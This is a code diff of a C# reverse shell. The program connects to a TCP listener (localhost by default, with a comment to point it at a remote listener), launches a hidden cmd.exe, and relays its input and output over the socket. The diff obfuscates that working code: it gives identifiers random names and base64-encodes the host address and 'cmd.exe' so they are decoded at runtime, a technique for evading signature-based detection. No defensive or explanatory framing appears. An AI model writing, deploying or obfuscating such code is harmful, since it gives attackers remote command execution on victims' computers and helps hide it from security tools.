@@ -6,27 +6,26 @@ using System.Threading;
 
 namespace TestApplication
 {
-    class Program
+    class C_YXpUjY
     {
-        static void Main(string[] args)
+        static void Main(string[] P_ZOCbLs)
         {
             // Change this to the remote listener's IP if needed
-            string remoteHost = "127.0.0.1";
-            int remotePort = 1234;
-
-            using (TcpClient client = new TcpClient())
+            string V_plmFld = M_mgbkf("MQ==") + M_mgbkf("Mg==") + M_mgbkf("Nw==") + M_mgbkf("Lg==") + M_mgbkf("MC4wLjE=");
+            int V_fBQtZA = 1234;
+            using (TcpClient V_VWAbbL = new TcpClient())
             {
                 try
                 {
-                    client.Connect(remoteHost, remotePort);
-                    using (NetworkStream stream = client.GetStream())
+                    V_VWAbbL.Connect(V_plmFld, V_fBQtZA);
+                    using (NetworkStream V_PlASsw = V_VWAbbL.GetStream())
                     {
                         // Start cmd.exe with redirected streams
-                        Process proc = new Process
+                        Process V_EAsPdD = new Process
                         {
                             StartInfo = new ProcessStartInfo
                             {
-                                FileName = "cmd.exe",
+                                FileName = M_mgbkf("Yw==") + M_mgbkf("bQ==") + M_mgbkf("ZA==") + M_mgbkf("Lg==") + M_mgbkf("ZXhl"),
                                 RedirectStandardInput = true,
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
@@ -34,39 +33,44 @@ namespace TestApplication
                                 CreateNoWindow = true
                             }
                         };
-                        proc.Start();
-
+                        V_EAsPdD.Start();
                         // Thread: stdin of this process → network
                         new Thread(() =>
                         {
                             try
                             {
-                                StreamReader procStdOut = proc.StandardOutput;
-                                StreamReader procStdErr = proc.StandardError;
-                                StreamWriter netWriter = new StreamWriter(stream) { AutoFlush = true };
-
-                                string line;
-                                while ((line = procStdOut.ReadLine()) != null)
+                                StreamReader V_PRAoLL = V_EAsPdD.StandardOutput;
+                                StreamReader V_ZPSpAP = V_EAsPdD.StandardError;
+                                StreamWriter V_QQzjqC = new StreamWriter(V_PlASsw)
                                 {
-                                    netWriter.WriteLine(line);
+                                    AutoFlush = true
+                                };
+                                string V_uFKavi;
+                                while ((V_uFKavi = V_PRAoLL.ReadLine()) != null)
+                                {
+                                    V_QQzjqC.WriteLine(V_uFKavi);
                                 }
-                                while ((line = procStdErr.ReadLine()) != null)
+
+                                while ((V_uFKavi = V_ZPSpAP.ReadLine()) != null)
                                 {
-                                    netWriter.WriteLine(line);
+                                    V_QQzjqC.WriteLine(V_uFKavi);
                                 }
                             }
-                            catch { }
-                        })
-                        { IsBackground = true }.Start();
-
-                        // Main thread: network → stdin of cmd.exe
-                        using (StreamReader netReader = new StreamReader(stream))
-                        using (StreamWriter procStdIn = proc.StandardInput)
-                        {
-                            string cmd;
-                            while ((cmd = netReader.ReadLine()) != null)
+                            catch
                             {
-                                procStdIn.WriteLine(cmd);
+                            }
+                        })
+                        {
+                            IsBackground = true
+                        }.Start();
+                        // Main thread: network → stdin of cmd.exe
+                        using (StreamReader V_hXpHNw = new StreamReader(V_PlASsw))
+                        using (StreamWriter V_twdnQj = V_EAsPdD.StandardInput)
+                        {
+                            string V_jEDptT;
+                            while ((V_jEDptT = V_hXpHNw.ReadLine()) != null)
+                            {
+                                V_twdnQj.WriteLine(V_jEDptT);
                             }
                         }
                     }
@@ -78,6 +82,14 @@ namespace TestApplication
                     Console.Error.WriteLine($"[!] Error: {ex.Message}");
                 }
             }
+        }
+
+        private static string M_mgbkf(string V_homft)
+        {
+            if (string.IsNullOrEmpty(V_homft))
+                return string.Empty;
+            byte[] V_xkgpd = Convert.FromBase64String(V_homft);
+            return System.Text.Encoding.UTF8.GetString(V_xkgpd);
         }
     }
 }
